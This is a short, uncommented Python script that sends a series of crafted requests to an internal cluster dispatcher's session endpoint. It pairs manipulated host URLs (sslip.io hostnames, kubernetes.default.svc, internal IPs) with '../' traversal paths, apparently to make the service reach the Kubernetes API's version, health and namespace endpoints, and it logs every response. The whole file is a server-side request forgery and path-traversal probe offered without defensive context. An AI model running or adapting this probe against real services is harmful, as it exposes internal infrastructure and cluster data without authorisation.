#!/usr/bin/env python3
import json, os, time, urllib.request, urllib.error
BASE=os.environ.get('BUILDMODE_DISPATCHER_URL','http://lrs-pygencc-dispatcher-canv2.canv2-sl-app-launcher.svc.cluster.local')
USER='snapgpt-kube-probe-20261106@armorerlabs.com'
CASES=[
 ('sslip_version','https://172-20-0-1.sslip.io','../../../../../../version'),
 ('sslip_healthz','https://172-20-0-1.sslip.io','../../../../../../healthz'),
 ('sslip_namespaces','https://172-20-0-1.sslip.io','../../../../../../api/v1/namespaces'),
 ('sslip_version_port','https://172-20-0-1.sslip.io:443','../../../../../../version'),
 ('dotted_version','https://172.20.0.1.sslip.io','../../../../../../version'),
 ('http443_version','http://172.20.0.1:443','../../../../../../version'),
 ('kube_http','http://kubernetes.default.svc','../../../../../../version'),
 ('kube_https_ip','https://172.20.0.1','../../../../../../version'),
]
OUT={'utc':time.strftime('%Y-%m-%dT%H:%M:%SZ',time.gmtime()),'cases':[]}
for name,host,path in CASES:
 body=json.dumps({'user_id':USER,'host_url':host,'project_path':path,'force':True},separators=(',',':')).encode()
 req=urllib.request.Request(BASE+'/session/init',data=body,method='POST',headers={'Content-Type':'application/json','X-SL-Token':'x'})
 t=time.monotonic(); rec={'name':name,'host_url':host,'project_path':path}
 try:
  with urllib.request.urlopen(req,timeout=20) as r: rec.update(status=r.status,body=r.read(20000).decode('utf-8','replace'))
 except urllib.error.HTTPError as e: rec.update(status=e.code,body=e.read(20000).decode('utf-8','replace'))
 except Exception as e: rec.update(error=repr(e))
 rec['elapsed']=round(time.monotonic()-t,3); OUT['cases'].append(rec)
print(json.dumps(OUT,sort_keys=True,separators=(',',':')))
